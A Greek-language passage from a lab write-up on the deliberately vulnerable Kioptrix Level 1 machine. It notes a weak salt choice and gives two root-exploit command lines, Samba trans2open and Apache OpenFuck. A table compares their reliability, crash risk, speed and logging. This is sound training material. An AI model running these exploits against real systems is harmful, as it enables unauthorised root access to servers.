**ο διαχειριστής χρησιμοποίησε το όνομα του λογαριασμού ως salt**. Αυτό είναι **εύρημα**:
επαναχρησιμοποίηση κωδικού ως salt **μηδενίζει το πλεονέκτημα** του salt.

**`install.log` στο `/root`** είναι **το αρχείο εγκατάστασης του Red Hat** — **αποδεικνύει ότι
είστε στο root directory**, κάτι που κανένας μη-root δεν μπορεί να διαβάσει.

### 8. Σύγκριση διαδρομών

```bash
# Και οι δύο διαδρομές δίνουν το ίδιο αποτέλεσμα:
# Samba:  ./trans2 0xbf TARGET        → uid=0 σε ~10 δευτερόλεπτα
# Apache: ./openfuck 0x6a TARGET 443  → uid=0 σε ~2 λεπτά, με -c 40
```

**Συμπέρασμα για την αναφορά σας:**

| | Samba trans2Open | Apache OpenFuck |
| --- | --- | --- |
| **Θύρα** | 139 | 443 |
| **Αξιοπιστία** | **Υψηλή** — σταθερή στοίβα | **Μέτρια** — ευαίσθητο στο heap layout |
| **Κίνδυνος crash** | **Χαμηλός** | **Υψηλός** — kernel panic |
| **Χρόνος** | ~10 δευτερόλεπτα | ~2 λεπτά (με `-c 40`) |
| **Ανίχνευση** | Samba logs | Apache access log |
| **Προτεινόμενο** | **Ναι — πρώτο** | Εναλλακτικά |

**Αυτός ο πίνακας είναι η πραγματική εργασία:** όχι «βρήκα root», αλλά **«βρήκα δύο διαδρομές,
και αυτή είναι η καλύτερη γιατί»**.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 4 — DC: 2](<04-dc-2.md>) · επόμενο: [Μηχάνημα 6 — BossPlayerCTF](<06-bossplayersctf-1.md>) · πλήρες walkthrough: [`labs/3-046-kioptrix-level-1-1`](../../labs/3-046-kioptrix-level-1-1/README.md)_
